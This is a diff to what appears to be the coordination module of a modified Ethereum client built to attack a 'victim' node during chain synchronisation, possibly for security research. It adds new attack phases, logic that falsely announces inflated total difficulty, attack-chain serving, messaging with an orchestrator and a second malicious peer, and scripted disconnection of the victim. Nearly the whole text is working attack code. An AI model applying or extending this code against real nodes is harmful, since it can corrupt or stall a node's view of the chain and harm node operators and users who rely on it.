@@ -80,6 +80,8 @@ var targetHead uint64
 var p2pserver *p2p.Server
 var staticVictimAdded bool
 var initialized bool
+var midRollbackPeer bool
+var servedSkeletons int
 
 
 
@@ -235,6 +237,24 @@ func SetVictimIfNone(v *p2p.Peer, td *big.Int) {
 
 			steppingDone = true
 			log("Set steppingDone =", steppingDone)
+		} else if attackPhase == utils.DeliveryPhase && midRollbackPeer {
+			attackPhase = utils.SnapReenablementPhase
+			log("Switched to", attackPhase, "phase")
+
+			err := sendMessage(msg.SetAttackPhase.SetContent([]byte{byte(attackPhase)}))
+			if err != nil {
+				Close()
+				fatal(err, "Could not announce new phase to orchestrator")
+			}
+		} else if attackPhase == utils.SnapReenablementPhase {
+			attackPhase = utils.OverflowPhase
+			log("Switched to", attackPhase, "phase")
+
+			err := sendMessage(msg.SetAttackPhase.SetContent([]byte{byte(attackPhase)}))
+			if err != nil {
+				Close()
+				fatal(err, "Could not announce new phase to orchestrator")
+			}
 		}
 
 		log("Set victim:", vID)
@@ -514,6 +534,28 @@ func DoingDelivery() bool {
 	}
 }
 
+func DoingSnapReenablement() bool {
+	select {
+	case <-quitCh:
+		fatal(utils.BridgeClosedErr, "Could not determine attack phase")
+		return false
+		
+	default:
+		return (attackPhase==utils.SnapReenablementPhase)
+	}
+}
+
+func DoingOverflow() bool {
+	select {
+	case <-quitCh:
+		fatal(utils.BridgeClosedErr, "Could not determine attack phase")
+		return false
+		
+	default:
+		return (attackPhase==utils.OverflowPhase)
+	}
+}
+
 func GetChainDatabase(chainType utils.ChainType) ethdb.Database {
 	select {
 	case <-quitCh:
@@ -587,6 +629,7 @@ func CheatAboutTd(peerID string, peerTD *big.Int) (*big.Int, bool, *common.Hash,
 
 		if (attackPhase == utils.PredictionPhase && lastOracleBit) ||
 		   (attackPhase == utils.SyncPhase && !terminatingStateSync) {
+		   	if !midRollbackPeer {
 				diff := latest(utils.TrueChain).Difficulty
 				supplement := big.NewInt(int64(utils.BlockSupplement))
 				supplement.Mul(supplement, diff)
@@ -614,6 +657,12 @@ func CheatAboutTd(peerID string, peerTD *big.Int) (*big.Int, bool, *common.Hash,
 					fatal(err, "Could not notify announcedSyncTd")
 				}
 				return td, mustCheatAboutTd, &head, nil
+			} else {
+				// This code is executed by the peer who made the mid rollback
+				// It is a preparation for the SnapReenablementPhase
+				head := latest(utils.TrueChain).Hash()
+				return utils.HigherTd, mustCheatAboutTd, &head, nil
+			}
 		}
 
 		if (attackPhase==utils.SyncPhase && terminatingStateSync) || attackPhase == utils.DeliveryPhase {
@@ -630,6 +679,12 @@ func CheatAboutTd(peerID string, peerTD *big.Int) (*big.Int, bool, *common.Hash,
 				}()
 			}
 
+			return td, mustCheatAboutTd, &head, nil
+		}
+
+		if attackPhase==utils.SnapReenablementPhase {
+			td := new(big.Int).Add(utils.HigherTd, bigOne)
+			head := latest(utils.TrueChain).Hash()
 			return td, mustCheatAboutTd, &head, nil
 		}
 	}
@@ -692,8 +747,7 @@ func MustUseAttackChain(query *GetBlockHeadersPacket, peer string) bool {
 		return false
 	}
 
-	// Remove "DeliveryPhase" later on.
-	if (attackPhase==utils.ReadyPhase || attackPhase==utils.PredictionPhase /*|| attackPhase==utils.DeliveryPhase*/) {
+	if attackPhase==utils.ReadyPhase || attackPhase==utils.PredictionPhase {
 		return true
 	}
 	return false
@@ -743,7 +797,6 @@ func LastPartialBatch(from uint64) bool {
 	}
 	return false
 }
-
 
 func Latest(chainTypeArg ...utils.ChainType) *types.Header {
 	chainType := attackPhase.ToChainType()
@@ -822,6 +875,16 @@ func SetAnnouncedSyncTD(td *big.Int) {
 }
 
 func SetSkeletonStart(start uint64) {
+	if attackPhase == utils.SnapReenablementPhase {
+		servedSkeletons++
+		if servedSkeletons >= 3 {
+			master = false
+			avoidVictim = true // Don't ever reconnect
+			victim.Disconnect(p2p.DiscUselessPeer)
+		}
+		return
+	}
+
 	// Keep track of skeleton only during sync phase.
 	if attackPhase != utils.SyncPhase {
 		return
@@ -1156,6 +1219,7 @@ func MidRollbackDone() bool {
 
 func MidRollback() {
 	midRollbackDone = true
+	midRollbackPeer = true
 	log("Set midRollback to true")
 	if err := sendMessage(msg.MidRollback); err != nil {
 		fatal(err, "Could not notify other peer about mid rollback")
@@ -1277,11 +1341,10 @@ func handleMessages() {
 					if attackPhase != utils.StalePhase && attackPhase != utils.SyncPhase && attackPhase != utils.DeliveryPhase {
 						mustChangeAttackChain = true
 					}
-					/*
-					if attackPhase == utils.DeliveryPhase {
-						CommitPRNG()
+					if attackPhase == utils.SnapReenablementPhase {
+						master = false
+						victim.Disconnect(p2p.DiscUselessPeer)
 					}
-					*/
 				}
 			case msg.ServeLastFullBatch.Code:
 				if !servedBatches[len(servedBatches)-2] {
